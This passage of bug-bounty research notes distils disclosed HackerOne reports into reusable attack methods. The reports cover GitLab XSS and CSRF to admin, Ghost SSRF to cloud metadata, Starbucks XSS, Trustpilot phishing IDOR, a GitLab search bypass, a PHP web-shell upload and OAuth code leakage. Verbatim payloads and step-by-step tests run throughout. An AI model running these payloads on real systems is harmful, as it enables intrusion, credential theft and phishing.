  2. THE PAYLOAD, verbatim: `<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">` — the sanitizer also allows `style` and `class`, so the link is styled "a transparent topmost layer" (fixed-top fixed-bottom overlay); a click ANYWHERE hands the `data-disable-with` HTML to rails-ujs which renders it.
  3. THE ENTRY POINT, verbatim: "An exploitation can be done via jobs' error messages which contain CI job names which are provided by users." — the payload rides in a CI JOB NAME in `.gitlab-ci.yml` (as a `dependencies:` entry of a downstream job); erase the upstream job's artifacts, retry the downstream job, and the error reflects the name: `This job could not start because it could not retrieve the needed artifacts: <payload job name>`.
  4. THE CSP PIVOT, verbatim: "on gitlab.com or an instance having CSP protection (with `strict-dynamic` value of `script-src`), the inline script, such as `onerror` ... will be prevented to trigger. In such a case, we may use `<form>` tag to trigger arbitrary API requests on behalf of the user" — the PoC form, verbatim: `<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>` — the reporter's own phrase: "this allows escalate to admin permission when administrator *click anywhere*". The giant invisible submit turns one click into a method-override PUT against the admin API with the victim's session.
DETECTION SIGNAL: a framework sanitizer (Vue `v-safe-html`, DOMPurify wrapper, Angular `[innerHTML]`) whose config names the attributes it REMOVES — the strip list is the audit surface: enumerate every behavior-bearing `data-*` the app's own JS interprets (rails-ujs `data-remote`/`data-url`/`data-type`/`data-method`/`data-disable-with`/`data-confirm`/`data-params`, htmx `hx-*`, Alpine `@`/`x-on`, Stimulus `data-action`/`data-controller`) and diff it against the sanitizer's strip list; stored content keeping `class`/`style` + an unlisted `data-*` = a one-click gadget. TELL: a stored field rendered through a "safe HTML" directive on a page whose JS reads `data-*` attributes.
CHAIN: any user who can name a CI job (or feed any stored field rendered through the directive) (primitive) -> the payload survives `v-safe-html` because `data-disable-with` is not on the strip list and `class`/`style` are allowed (bypass) -> the transparent full-viewport link makes ANY click trigger it (escalation: reliable one-click interaction) -> without CSP the rendered `<img onerror>` = stored XSS in the victim's session; WITH `strict-dynamic` CSP the same injection is the giant `<form action=/api/v4/users/<id>?_method=PUT&admin=true>` = one-click CSRF as the victim (impact: "escalate to admin permission when administrator click anywhere" — privilege escalation to admin; report rated Medium 4.4; the admin leg is the high-impact chain). Per doctrine §8: preconditions = ability to supply the stored field + one victim click; gain = admin privilege escalation via the victim's session.
TRANSFERABLE TEST: on any app with a "safe HTML" sanitizer directive: (1) grep the frontend bundle and framework for behavior-bearing `data-*` attributes and grep the sanitizer config for its strip/allow list; (2) submit `<a class="fixed-top fixed-bottom text-hide cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">`-style input (and each unlisted `data-*`) into every stored field that renders through the directive, styled as a full-viewport overlay with allowed `class`/`style`; (3) if CSP blocks inline handlers, retest with `<form action=<state-changing API> method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>` (add `?_method=PUT`-style overrides where the stack supports them) and confirm one click fires the request with the victim's session. Rule: **a sanitizer that strips a LIST of framework attributes is only as strong as the list — every `data-*` the app's own JS interprets (especially HTML-rendering ones like `data-disable-with`) is a gadget, and under a script-blocking CSP the payload degrades to a one-click form CSRF against the state-changing API.**
DEDUPE/DELTA: `1579645`, `data-disable-with` (as a recorded technique) = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: §17.153 (SAME product and SAME directive `v-safe-html`, but the bypass there is the app's OWN CUSTOM ELEMENT `gl-emoji` tag-builder string interpolation + an entity-encoded server-sanitizer bypass — an emitted-markup gap, not a strip-list gap); the detection-signal lines at bugbountyhuntingskills.md:3831/21357 already name framework attrs (`data-remote`, `data-type="script"`, htmx/Alpine) as a sanitizer-audit tell but carry no entry for the `data-disable-with` render-on-click gadget; the inbound-mail CSS-octal entry (ledger ~3559-3568: injected `<form data-controller="beacon">` auto-submitted with the app's CSRF token -> ATO) is the same broad family (HTML injection -> form -> sensitive action) but its mechanism is a Stimulus auto-submit carrying a captured CSRF token, not a CSP-dodging one-click method-override form. NEW DELTA: (a) an attribute STRIP-LIST (vs an allow-list) as the bypass surface; (b) `data-disable-with` as an HTML-render-on-click gadget + full-viewport overlay via allowed `class`/`style`; (c) the documented XSS-under-CSP degradation to a one-click FORM CSRF reaching admin privilege escalation. New general method -> §17.594.
FRESHNESS: submitted 2022-05-24 / disclosed 2022-11-16 — outside the preferred 6-12 month window; read because assigned. The strip-list rule recurs in every app that sanitizes HTML in front of a JS framework that interprets `data-*`.

STATUS: UNVERIFIED (not reproduced — no Ghost instance was stood up this pass; the PoC is the reporter's verbatim).
CLASS: SSRF with internal reach and RETURNED response body (full-read, incl. cloud metadata) in an oEmbed embed-URL fetcher — the second-hop URL is parsed out of the attacker's HTML and fetched with zero validation.
CORE METHOD:
  1. THE SURFACE: the Ghost admin editor's embed "Other..." input sends `GET /ghost/api/v3/admin/oembed/?url=<URL>&type=embed` (session: `ghost-admin-api-session=<publisher session>`; any publisher role — verbatim: "editor, author, contributor, administrator").
  2. THE FIRST-HOP BLOCK: pointing `url` directly at `http://169.254.169.254/metadata/v1.json` returns "only validation error" — `fetchOembedData()` "doesn't receive any content"; the direct internal URL is rejected.
  3. THE BYPASS — the two-hop shape, verbatim from the cited source `core/server/api/canary/oembed.js`: `fetchOembedData(url)` runs `request(url, {method:'GET', followRedirect: true, ...})` on the attacker URL, then `const oembedUrl = getOembedUrlFromHTML(response.body)` where `getOembedUrlFromHTML = (html) => cheerio('link[type="application/json+oembed"]', html).attr('href')`, then `request(oembedUrl, {method:'GET', json:true}).then((response) => response.body)` — the reporter, verbatim: "before and after executing getOembedUrlFromHTML() function don't exist any validation which can prevent against from the SSRF attacks". The attacker hosts an HTML page whose `<link rel="alternate" type="application/json+oembed" href="http://169.254.169.254/metadata/v1.json"/>` names the INTERNAL target; the server fetches the attacker page (passes validation), extracts the href, fetches the INTERNAL URL and RETURNS its body.
  4. THE PoC PAGE, verbatim: `<!DOCTYPE html><html><head>...<link rel="alternate" type="application/json+oembed" href="http://169.254.169.254/metadata/v1.json"/></head><body></body></html>` served from `python -m SimpleHTTPServer 8000` (ngrok for remote targets), then `GET /ghost/api/v3/admin/oembed/?url=http://<attacker>/page.html&type=embed` with the publisher cookie — verbatim: "we finally receive a response from the internal DigitalOcean service with my Droplet MetaData".
DETECTION SIGNAL: any "embed / preview / unfurl / import-from-URL" server-side fetcher that PARSES the fetched document for a follow-up URL (oEmbed discovery `<link type="application/json+oembed">`, `og:image`, meta refresh, RSS enclosure, sitemap) and fetches it; source showing validation/allowlist on the FIRST url only with the extracted href passed straight to a second request; a response that returns the second fetch's body. TELL: the app fetches your page and then fetches AGAIN to a URL you planted inside it.
CHAIN: attacker with any publisher-role account on the Ghost instance (primitive) -> the direct internal URL in `?url=` is rejected (validation covers hop 1) -> attacker hosts HTML with `<link type="application/json+oembed" href="<internal target>"` (bypass: the second hop is parsed from attacker-controlled HTML and never validated) -> the server fetches the internal URL and returns the body (escalation: full-read SSRF, not blind) -> `http://169.254.169.254/metadata/v1.json` DigitalOcean droplet metadata demonstrated; on AWS the same hop is `http://169.254.169.254/latest/meta-data/iam/security-credentials/` = the doctrine §4 SSRF -> IAM creds -> RCE leg (impact: arbitrary internal GET with returned body incl. cloud metadata from a blog editor). Per doctrine §8: preconditions = publisher-role session; gain = internal/cloud-metadata read.
TRANSFERABLE TEST: on any server-side URL fetcher (embed/oEmbed, link preview/unfurl, import-from-URL, PDF/screenshot renderer): (1) point it directly at `http://169.254.169.254/` / `http://127.0.0.1:<port>/` and note whether it is blocked; (2) if blocked, host an HTML page that plants a second-hop URL in every discovery form (`<link rel="alternate" type="application/json+oembed" href="http://169.254.169.254/latest/meta-data/">`, `<meta http-equiv="refresh" content="0;url=…">`, `og:image`, and a 302 `Location`) and submit YOUR page as the URL; (3) if the response carries the internal content (or your listener logs the server fetching the planted URL), validation covers only the first hop — full-read SSRF; (4) extract `iam/security-credentials/` for the AWS escalation. Rule: **when a fetcher PARSES the fetched page for a follow-up URL (oEmbed discovery), the second hop is attacker-controlled input — host the discovery page yourself and point the parser at the metadata service; first-hop validation is defeated by construction.**
DEDUPE/DELTA: `793704`, `whoareme`, `fetchOembedData`, `getOembedUrlFromHTML`, `json+oembed`, `ghost/api` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the preview/unfurl SSRF family (ledger ~3363-3365 — `og:title` read oracle from the FIRST fetch's echoed metadata; `?url=` at 169.254.169.254 directly); the full-read-SSRF material (ledger ~2440-2442 — "the fetched body persisted and retrievable elsewhere", `@`-userinfo bypass) — both validate and fetch the SAME url; §17.331 (Next.js middleware `Location` -> full-read SSRF) and §17.503 (Nextcloud push `proxyServer` SSRF) are different gadgets; the Steam oEmbed entry (ledger ~3106-3114) is oEmbed as an XSS/Electron-sandbox carrier, not SSRF. NEW DELTA: the SECOND-HOP gadget — the server fetches attacker HTML, PARSES a URL out of it (`link[type="application/json+oembed"]`) and fetches THAT with no validation, returning the body; first-hop validation is defeated by construction. New general method -> §17.595.
FRESHNESS: submitted 2020-02-11 / disclosed 2020-03-09 — well outside the preferred 6-12 month window; read because assigned. The mechanism (oEmbed discovery second fetch) recurs in every embed/preview feature; Ghost 3.5.2 is long EOL, but the pattern is product-independent.

SOURCE: https://hackerone.com/reports/531042  2026-11-12
ROUTE: live `https://hackerone.com/reports/531042.json` (HTTP 200, `visibility: full`, `vulnerability_information` 1,250 B read IN FULL) — the route that worked. Metadata: Starbucks, "Reflected XSS in https://www.starbucks.com/account/create/redeem/MCP131XSR via xtl_amount, xtl_coupon_code, xtl_amount_type parameters", weakness Cross-site Scripting (XSS) - Reflected, severity medium, reporter zl33t (the team summary credits "zayn1337"), submitted 2019-04-08, disclosed 2019-11-13, resolved.
STATUS: UNVERIFIED (not reproduced — no Starbucks request was sent this pass; the requests below are the reporter's verbatim PoC).
CLASS: reflected XSS (CWE-79) with a CONDITIONALLY-GATED sink — the reflection in `xtl_amount_type` is INERT when that parameter is mutated alone and only fires when the SIBLING parameters (`xtl_coupon_code`, `xtl_amount`) are also mutated ("the parameters are complementary to each other").
CORE METHOD:
  1. THE ENDPOINT, verbatim: `https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=81431&xtl_amount=0.0&xtl_amount_type=DOLLAR_VALUE` — a coupon-redeem page driven by three complementary parameters (note the DUPLICATE `xtl_coupon_code` key).
  2. THE GATED REFLECTION, verbatim: "change parameter `xtl_amount_type` to `</script><svg/onload=alert()>` >note:if you go enter this the payload not work but!!!!! you change `xtl_coupon_code` and `xtl_amount` payload will work" — the same payload alone does NOT fire; the siblings select the code path that echoes it. The reporter's own summary, verbatim: "the parameters are complementary to each other".
  3. THE WORKING REQUEST, verbatim: `https://www.starbucks.com/account/create/redeem/MCP131XSR?xtl_coupon_code=1&xtl_coupon_code=hkjhkjh&xtl_amount=jhkjhj&xtl_amount_type=ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E` — both siblings set to garbage, payload in `xtl_amount_type`.
  4. THE MECHANISM: the redeem flow's validation/error branch — the one that RENDERS a parameter value into the page — is only reached when the coupon/amount validation sits in the mutated state; fuzzing one parameter alone walks the "valid" branch and never sees the reflection.
DETECTION SIGNAL: a multi-parameter form where a value echoes only for certain values of OTHER parameters; a parameter that looks non-reflective when fuzzed alone; duplicate query-string keys where the later/mutated instance changes the branch; an error/validation page that echoes one of its inputs. TELL: "complementary" parameters — the reflection is a property of the parameter COMBINATION, not of the parameter.
CHAIN: attacker lures a user to the crafted redeem URL (primitive: reflected input) -> the payload executes only in the sibling-gated validation branch (bypass: single-param probing and single-param WAF rules never reach it) -> `</script><svg/onload=alert(document.domain)>` runs in the www.starbucks.com origin (impact: JS execution in the main site's origin — the report's own impact, verbatim: "The attacker can execute JS code"; no ATO leg documented). Per doctrine §8: preconditions = victim opens the crafted link; gain = JS execution in the starbucks.com origin.
TRANSFERABLE TEST: on any multi-parameter form (redeem/checkout/search/booking), fuzz a MATRIX, not single params: (1) mutate the candidate param with a reflection payload while siblings hold their defaults and note the response; (2) re-send the same payload while mutating EACH sibling (garbage, empty, duplicate keys) one at a time and then combined; (3) a payload that fires ONLY in case (2) is a conditionally-gated reflection. Rule: **a parameter that looks inert alone may reflect only in the validation branch its SIBLING parameters select — never close a param on single-param testing; fuzz parameter combinations and duplicate keys first.**
DEDUPE/DELTA: `531042`, `xtl_amount`, `xtl_coupon_code`, `xtl_amount_type`, `MCP131XSR`, `complementary` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the generic reflected-XSS family + payload tables (the `</script><svg/onload=…>` break-out itself is recorded; this report adds no new sink); Bugbountyskills.md:12053 ("move to a sibling param that lacks the validator") and the sibling-parameter material at ledger 6350/14939 are about routing the PAYLOAD to an unvalidated sibling — here the siblings carry no payload, they GATE the branch that renders it. NEW DELTA: parameter interdependency as a DETECTION problem — a conditional sink invisible to single-parameter fuzzing. Ledger entry only — no §17 slot (detection delta of the recorded reflected-XSS family).
FRESHNESS: submitted 2019-04-08 / disclosed 2019-11-13 — far outside the preferred 6-12 month window; read because assigned. The interdependency lesson is product-independent.

SOURCE: https://hackerone.com/reports/592090  2026-11-12
ROUTE: the live `.json` 404s and the live page is sign-in-walled; the route that worked was the HuggingFace `Hacker0x01/hackerone_disclosed_reports` parquet (local duckdb query; `visibility: full`, `vulnerability_information` 2,158 B read IN FULL). Metadata: Trustpilot, "IDOR in sending support email upon Verifying user business domain", weakness Business Logic Errors, reporter secnugget, submitted 2019-05-29, disclosed 2019-08-21, resolved, bounty, 43 votes.
STATUS: UNVERIFIED (not reproduced — no Trustpilot request was sent this pass; the request below is the reporter's verbatim PoC).
CLASS: business-logic / IDOR on an OUTBOUND EMAIL-DISPATCH endpoint (CWE-639 + content injection) — the JSON body's `email` field is the message RECIPIENT with no ownership check, and a free-text field (`phoneNumber`, "You can add text upto 94 characters") is interpolated into the vendor-branded email body.
CORE METHOD:
  1. THE ALTERNATIVE VERIFICATION PATH, verbatim: Trustpilot Business verifies domain ownership with 5 choices, "But there's another one, which is through sending a support ticket. By this you can send message to a support and hope to help you out."
  2. THE ACCOUNT PRECONDITION + CHECK BYPASS, verbatim: "First you need to register a valid account. If you don't own a domain it's Ok. There's a way to bypass the check. Just intercept the post request on `https://api.trustpilot.com/v1/business-requests/signup?utm_source=sign_up_link&utm_medium=business_login_page&utm_campaign=login` and modify the `email` parameter to your preferred email. Once set, check your email and click the verify." → redirected to `https://businessapp.b2b.trustpilot.com/#/claim/`, where the bottom link "Fill out this form" opens the support form.
  3. THE REQUEST, verbatim: `POST /v1/private/business-users/5cee035f00bf83001b207d67/activation/support HTTP/1.1` / `Host: api.trustpilot.com` / `Content-Type: application/json;charset=utf-8` / `Authorization: Bearer` / `ApiKey:` / `Origin: https://businessapp.b2b.trustpilot.com` with body `{"name":"test","email":"[reducted]","domain":"","phoneNumber":". Please follow this link to verify https://e-corp.ord","message":"test. pls ignore","locale":"en-US"}`.
  4. THE TAMPER, verbatim: "Final step is to modify the `email` and `phoneNumber` parameter. This is will send an email you a target user and let you add a malicious link in the email." — `email` = ANY victim address (IDOR: the notification is dispatched to an address the caller does not own); `phoneNumber` = 94 chars of free text carrying a URL ("Please follow this link to verify https://e-corp.ord") that the email renders inside the verification message. The report also states the parameter limits verbatim: "The `email` parameter is letting you to send email to another user, which don't own" / "The `phoneNumber` parameter is controllable. You can add text upto 94 characters enough to fool a user."
  5. THE IMPACT, verbatim: "IDOR which leads a phishing email to target any users" — the message leaves Trustpilot's real sender infrastructure with attacker-chosen recipient AND attacker-chosen link.
DETECTION SIGNAL: any support/verification/claim/appeal flow that dispatches a notification email from JSON body fields — especially a field named `email`/`to`/`recipient` NOT derived from the session; free-text fields (`phoneNumber`, `message`, `name`, `comment`) interpolated into the same message; a domain-ownership flow with an alternative "contact support" path reusing the verification email template. TELL: the vendor's own email can be aimed at an address of your choosing.
CHAIN: attacker registers a business account and bypasses the domain-ownership check by tampering `email` at `POST /v1/business-requests/signup` (primitive) -> reaches `POST /v1/private/business-users/<id>/activation/support`, which reuses the domain-verification email (primitive) -> sets `email` to ANY victim and `phoneNumber` to a 94-char string carrying an attacker link (bypass: no ownership check on the recipient; free text rides in the body) -> the victim receives a Trustpilot-branded "verify your domain" email containing the attacker's link (escalation: TRUSTED-SENDER phishing — the message comes from the real vendor, so sender-reputation/brand checks pass) -> victim clicks -> credential capture on the attacker site = account impact of the target user. Per doctrine §8: preconditions = an attacker business account + the support-form flow; gain = arbitrary-recipient vendor-branded email with attacker-controlled link content.
TRANSFERABLE TEST: on any domain-verification / business-claim / support-ticket flow that triggers a notification: (1) intercept the dispatch request and look for a body field naming the recipient; set it to an address YOU own — the vendor's email arriving in your inbox proves the recipient is an unchecked object reference; (2) put a marker + a URL into EVERY free-text field and read the received message for both; (3) chain arbitrary recipient + injected link = targeted phishing from the vendor's own infrastructure. Rule: **the recipient field of a notification-dispatch API is an object reference — if the body, not the session, decides who gets the vendor's email, and free-text fields ride in the message, the endpoint is an IDOR + content-injection pair that turns the vendor's mail infrastructure into a phishing sender.**
DEDUPE/DELTA: `592090`, `secnugget`, `trustpilot`, `activation/support`, `business-requests`, `business-users` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the OTP delivery-destination injection entry (ledger 6256/6264 — an unvalidated SIBLING field concatenated into an SMS gateway's separator-delimited recipient LIST; message content not attacker-controlled); the SSTI-in-transactional-email entry (ledger 2902 — template injection in the email SINK, not recipient control); the From:/Reply-To spoofing transferable test (ledger 4092 — spoofing the SENDER to hijack inbound flows, the inverse direction); the Mail.ru iOS notification IDOR pointer (ledger 2915) was INVALID/unreadable and never recorded. NEW DELTA: (a) the body `email` field as an unchecked RECIPIENT reference on an OUTBOUND dispatch endpoint (the IDOR direction is SENDING, not reading); (b) free-text (`phoneNumber`) content injection into the vendor-branded message; (c) the documented chain to trusted-sender phishing. New general method -> §17.596.
FRESHNESS: submitted 2019-05-29 / disclosed 2019-08-21 — far outside the preferred 6-12 month window; read because assigned. The dispatch-endpoint pattern (body fields naming the recipient + message content) recurs in every support/verification flow.

STATUS: UNVERIFIED (not reproduced — no GitLab instance was stood up this pass; the request below is the reporter's verbatim PoC).
CLASS: BAC / missing authorization on a SECONDARY API route (CWE-862) — a project's per-FEATURE visibility restriction ("Only Project Members") is enforced by the canonical feature routes but NOT by the project-scoped SEARCH API, whose ACL resolves the project by VISIBILITY only and never consults the feature settings.
CORE METHOD:
  1. THE SETUP, verbatim: "Create a public project, disable all features for non-project members by setting all features under `https://gitlab.com/xanbanx/test-search/edit` to `Only Project Members`" then "Create a new milestone, e.g., named `milestone`".
  2. THE BYPASS REQUEST, verbatim: "As a non-project member perform the following API request (substitute the project id)" — `curl --request GET --header "PRIVATE-TOKEN: <YOUR-TOKEN>" https://gitlab.example.com/api/v4/projects/<project-id>/search?search=milestone&scope=milestones`.
  3. THE RESPONSE, verbatim: "Although the user does not have access to the project and is no project member, the API returns:" the full milestone objects — `[{"id": 123, "iid": 1, "project_id": 12, "title": "milestone", "description": "milestone", "state": "active", "created_at": "...", "updated_at": "...", "due_date": null, "start_date": null, "web_url": ".../milestones/1"}]`.
  4. THE MECHANISM: the feature restriction is implemented as a per-feature filter inside the CANONICAL read routes; the search code path resolves the container by visibility (public project = reachable) and never applies the feature settings — so every restricted feature is readable by pointing `scope=` at it with any valid token.
  5. THE IMPACT, verbatim: "By using the search API any user with limited access can enumerate all milestones via the search API. Milestones can include critical information, e.g., related to upcoming security milestones, etc.."
DETECTION SIGNAL: a platform where admins restrict/dispose features per project/tenant ("Only Project Members", feature toggles, "disabled for guests") while the container itself stays reachable (public project, shared workspace); a search/index/export/GraphQL route taking a SCOPE/type parameter (`scope=milestones|issues|wiki_blobs|blobs|notes|commits`) that resolves the container by visibility only. TELL: the restricted feature refuses on the canonical route but answers AGAIN on the search route.
CHAIN: a public project whose every feature is set to "Only Project Members" (primitive: the admin explicitly restricted the data) -> any non-member with any valid token calls `/api/v4/projects/<id>/search?search=<term>&scope=<feature>` (bypass: the search ACL checks project visibility, not the feature setting) -> the restricted feature's objects are returned in full (impact: cross-member read of deliberately restricted data — milestones via `scope=milestones`, and by the same request shape every other `scope=` value; H1 rated Low; doctrine maps "limited cross-user data read" to P3). Per doctrine §8: preconditions = a reachable container with restricted features + any account/token; gain = full read of the restricted feature data.
TRANSFERABLE TEST: on any platform with per-project/per-tenant FEATURE or visibility settings: (1) lock a test container down — set EVERY feature to members-only/disabled while keeping the container reachable; (2) as a NON-member (or a fresh token), walk every secondary route with a scope/type parameter — `GET /api/v4/projects/<id>/search?search=a&scope=milestones` plus each sibling scope (`issues`, `wiki_blobs`, `blobs`, `notes`, `commits`, `users`), then GraphQL, exports, feeds, autocomplete; (3) any restricted object returned = the restriction is a canonical-route filter, not a data ACL. Rule: **a feature restriction is only real if the search/index layer enforces it too — after locking a container down, re-derive each restricted resource through every `scope=`/type-parameterized secondary route; the search path routinely checks container visibility and forgets the feature settings.**
DEDUPE/DELTA: `460815`, `xanbanx`, `scope=milestones` = 0 hits across the three write targets. The two `Only Project Members` hits (ledger 2661 / Bugbountyskills.md 20528) are a DIFFERENT GitLab report — the project-TEMPLATE picker's `available_custom_project_templates` returning feature-restricted projects inside a create-from-template chain; the `search?scope=` hits at ledger 2630/3290 are the `ref` argv-injection RCE entries on the same endpoint family. Related-but-distinct REVIEWED and NOT re-recorded: §17.313 (the UI's ACL filter vs the object's ACL — FIELD-level leakage from an alternate representation of an object the caller may read; here the caller may NOT read the feature at all and a whole RESOURCE class leaks through a different route); the search-count boolean-oracle entry (ledger 12417 — a count over non-public content, different mechanism); the generic "enumerate the sibling read endpoints the UI never calls" heuristic (ledger 2827). NEW DELTA: admin-configured FEATURE RESTRICTIONS bypassed wholesale by a scope-parameterized search API — a container-level ACL gap on a secondary index route, not a field gap. New general method -> §17.597.
FRESHNESS: submitted 2018-12-11 / disclosed 2019-07-19 — far outside the preferred 6-12 month window; read because assigned. The pattern (feature settings enforced on canonical routes, not on search/index) is platform-independent and re-detectable in minutes on any self-hosted GitLab/Gitea/wiki/PM stack.

SOURCE: https://hackerone.com/reports/357858  2026-11-12
ROUTE: live `https://hackerone.com/reports/357858.json` (HTTP 200, `visibility: full`, `vulnerability_information` 3,051 B read IN FULL) — the route that worked. Metadata: Monero, "forum.getmonero.org Shell upload", weakness Code Injection, severity high, reporter `kaulse`, submitted 2018-05-26, disclosed 2018-07-27, Closed.
STATUS: UNVERIFIED (not reproduced — no upload was sent to forum.getmonero.org this pass; every command and URL below is verbatim from the report body).
CLASS: RCE via unrestricted profile-image upload -> web shell (CWE-434) — the payload rides in image METADATA, the stored extension is the attacker's, the upload response 500s while the file is persisted anyway, and the storage name is a deterministic transform of username + time.
CORE METHOD:
  1. THE SINK, verbatim: "The method uploadProfile in the UsersController allows an attacker to upload a shell to the target server due to lack of image validation."
  2. THE PAYLOAD CARRIER, verbatim: "Find a nice picture and embed the shell into the image like this `exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png`" — the PHP sits in EXIF, so any content check that confirms "this is a real image" passes.
  3. THE EXTENSION OVERRIDE, verbatim: "Rename the jpg/png picture to the `.php` extension." then "Upload the picture."
  4. THE ERROR-PATH PERSISTENCE, verbatim: "You will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp." — the handler throws AFTER writing the file; the error response is not evidence of failure.
  5. THE NAME RECONSTRUCTION, verbatim: "Use the timestamp to find your shell: `https://forum.getmonero.org/uploads/profile/[USERNAMAE][timestamp].php`" — the stored name is `<username><unix-timestamp>.php`; the reporter's live shells: `https://forum.getmonero.org/uploads/profile/lNobodyl1527340454.php` and `/uploads/profile/lNobodyl1527341021.php`.
  6. EXECUTION: the web server maps `.php` to the interpreter — the report shows the full `/etc/passwd` dump (root, service accounts, the `fluffypony` user shell).
DETECTION SIGNAL: an upload that returns a 4xx/5xx yet the file appears in the upload directory (error-path persistence); a stored filename built from user-controlled + time values (username + unix timestamp — reconstructable from the response clock); an image upload whose validation is content/MIME-based while the STORED NAME keeps the attacker's extension; profile/avatar "uploadProfile"-style handlers. TELL: a failed-looking upload whose storage name you can predict.
CHAIN: any account with profile-image upload (primitive) -> PHP in EXIF + `.php` extension (bypass: content-based image validation passes; the extension is never re-checked against an allowlist) -> 500 response but the file is written (bypass: the error path persists the upload) -> deterministic name `<username><timestamp>` reconstructed from the response time (bypass: no need for a listing oracle) -> web shell request executes `file_get_contents("/etc/passwd")` (impact: RCE on the forum host, full filesystem read demonstrated). Per doctrine §8: preconditions = an account able to upload a profile image; gain = server-side code execution as the web user.
TRANSFERABLE TEST: on ANY image/document upload: (1) `exiftool -documentname='<?php system($_GET["c"]); ?>' img.png`, rename to `img.php` (also try `.phtml`, `.php5`, `.php.jpg`, `.php%00.png`, trailing-dot/space variants); (2) upload and DO NOT trust the response — an error page may still mean the file landed; derive the storage path from `<username><unix-timestamp>` (or the response's Date header) and from any path echoed in errors/JS; (3) request the reconstructed URL with `?c=id`; command output = RCE. Rule: **a failed-looking upload is not a failed upload — image-metadata payloads survive "is it an image" checks, the extension is the execution switch, and a deterministic name derived from username + timestamp turns the 500-error blind spot into a working shell URL.**
DEDUPE/DELTA: `357858`, `kaulse`, `documentname`, `uploads/profile`, `lNobodyl`, `uploadProfile` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the GitLab ExifTool EVAL RCE (ledger ~2319 — Perl injection into the metadata-STRIPPER's parser, content-sniff dispatch); the Shopify avatar EXIF XSS (ledger ~12014 — HTML in a `tEXt` chunk for stored XSS on a CDN); the generic class checklist line "Arbitrary File Upload: extension bypass, content-type spoof, double extension, WebShell upload" (Bugbountyskills.md:15748) — a checklist, no method. NEW DELTA: the composite webshell method — EXIF-carrier payload + attacker extension + error-path persistence + username+timestamp name reconstruction. New general method -> §17.598.
FRESHNESS: submitted 2018-05-26 / disclosed 2018-07-27 — far outside the preferred 6-12 month window; read because assigned. The method (metadata payload + extension switch + error-path persistence) is product-independent and re-detectable on any self-hosted forum/CMS upload.

SOURCE: https://hackerone.com/reports/292783  2026-11-12
ROUTE: live `https://hackerone.com/reports/292783.json` (HTTP 200, `visibility: full`, `vulnerability_information` 2,779 B read IN FULL) — the route that worked. Metadata: Ed (edoverflow.com), "Oauth flow on the comments widget login can lead to the access code leakage", weakness Improper Authentication - Generic, severity low, reporter `sp1d3rs`, submitted 2017-11-24, disclosed 2017-11-24, Closed.
STATUS: UNVERIFIED (not reproduced — no authorize request was sent this pass; every request line and quote below is verbatim from the report body).
CLASS: OAuth authorization-code leakage (credential theft via `Referer`) — a `redirect_uri` allow-listed at DOMAIN scope (any path accepted) combined with a PAGE-SCOPED code-stripping mitigation: the scrubber that removes `code` from the URL runs only on pages carrying the comments widget, so an attacker-chosen scrub-less path keeps the code in the URL where ordinary outbound navigation leaks it in the Referer.
CORE METHOD:
  1. THE FLOW + THE MITIGATION: GitHub OAuth (`client_id=5f45cc999f7812d0b6d2`) into the comments widget on `https://edoverflow.com/2017/[post-title]/`; on successful auth the widget page strips `code` from the URL — verbatim: "upon successful authentication, so there was no visible way to do the leakage thorugh, for example, Referer header upon clicking some external link in the blogpost."
  2. THE ALLOW-LIST PROBE, verbatim: "I discovered, that it was possible to manipulate the `redirect_uri` parameter, using the arbitrary directories, since it looked like whole `https://edoverflow.com` URL was whitelisted." — request verbatim: `https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect_uri%3Dhttps%253A%252F%252Fedoverflow.com%252F1%26scope%3Dpublic_repo` — a NON-EXISTENT path `/1` still receives the code, verbatim: "code was not stripped. So it became clear for me, that the code strips only on pages with a comment widget."
  3. THE SCRUB-BYPASS TARGET: whitelisted pages WITHOUT the widget — `https://edoverflow.com/about/` and `https://edoverflow.com/metadata` — same authorize URL with `redirect_uri=https%3A%2F%2Fedoverflow.com%2Fabout%2F` (and `/metadata`).
  4. THE LEAK, verbatim: "i was able to leak the access code with user interaction to the several sites in the Referer header, like `keybase.io`, `liberapay.com`, `hackerone.com`, `crypto101.io`, `twitter.com`, `youtube.com` and several Press sites like Bloomberg." (the code rides `Referer: https://edoverflow.com/about/?code=…` when the victim follows any external link on the landing page).
  5. RESIDUAL ORACLE even on scrubbed pages, verbatim: "the only one code leakage to the `https://fonts.googleapis.com/css?family=Inconsolata` upon `code` verification (since it returned 200 OK)".
DETECTION SIGNAL: an OAuth `redirect_uri`/`return_to` allow-list matching a whole DOMAIN (any path); a post-auth script that removes `code`/`token` from the URL on SOME pages only (widget/callback/landing pages); a redirect landing page carrying third-party links or resources (Referer egress); the code persisting in the URL bar on any accepted path that lacks the scrubber. TELL: the same authorize URL delivers `?code=` to `/1` but not to the widget page.
